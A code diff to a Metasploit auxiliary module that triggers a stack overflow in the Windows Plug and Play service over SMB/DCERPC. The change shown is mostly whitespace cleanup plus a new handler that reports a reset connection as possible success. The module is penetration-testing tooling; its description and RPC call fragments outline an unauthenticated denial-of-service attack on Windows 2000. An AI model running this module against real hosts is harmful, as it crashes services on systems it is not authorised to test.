@@ -9,12 +9,9 @@
 # http://metasploit.com/framework/
 ##
 
-
 require 'msf/core'
 
-
 class Metasploit3 < Msf::Auxiliary
-
 
 	include Msf::Exploit::Remote::DCERPC
 	include Msf::Exploit::Remote::SMB
@@ -24,7 +21,7 @@ class Metasploit3 < Msf::Auxiliary
 		super(update_info(info,
 			'Name'           => 'Microsoft Plug and Play Service Registry Overflow',
 			'Description'    => %q{
-				This module triggers a stack overflow in the Windows Plug
+					This module triggers a stack overflow in the Windows Plug
 				and Play service. This vulnerability can be exploited on
 				Windows 2000 without a valid user account. Since the PnP
 				service runs inside the service.exe process, this module
@@ -48,18 +45,17 @@ class Metasploit3 < Msf::Auxiliary
 			[
 				OptString.new('SMBPIPE', [ true,  "The pipe name to use (browser, srvsvc, wkssvc, ntsvcs)", 'browser']),
 			], self.class)
-
 	end
 
 =begin
 
-  /* Function 0x0a at 0x767a54a8 */
-  long function_0a (
-    [in] [unique] [string] wchar_t * arg_00,
-    [out] [size_is(*arg_02)] [length_is(*arg_02)] wchar_t * arg_01,
-    [in,out] long * arg_02,
-    [in] long arg_03
-  );
+/* Function 0x0a at 0x767a54a8 */
+long function_0a (
+	[in] [unique] [string] wchar_t * arg_00,
+	[out] [size_is(*arg_02)] [length_is(*arg_02)] wchar_t * arg_01,
+	[in,out] long * arg_02,
+	[in] long arg_03
+);
 
 =end
 
@@ -104,6 +100,8 @@ class Metasploit3 < Msf::Auxiliary
 			dcerpc.call(0x0a, stubdata)
 		rescue Rex::Proto::DCERPC::Exceptions::NoResponse
 			print_good('Server did not respond, this is expected')
+		rescue ::Errno::ECONNRESET
+			print_good('Connection reset by peer (possible success)')
 		rescue => e
 			if e.to_s =~ /STATUS_PIPE_DISCONNECTED/
 				print_good('Server disconnected, this is expected')
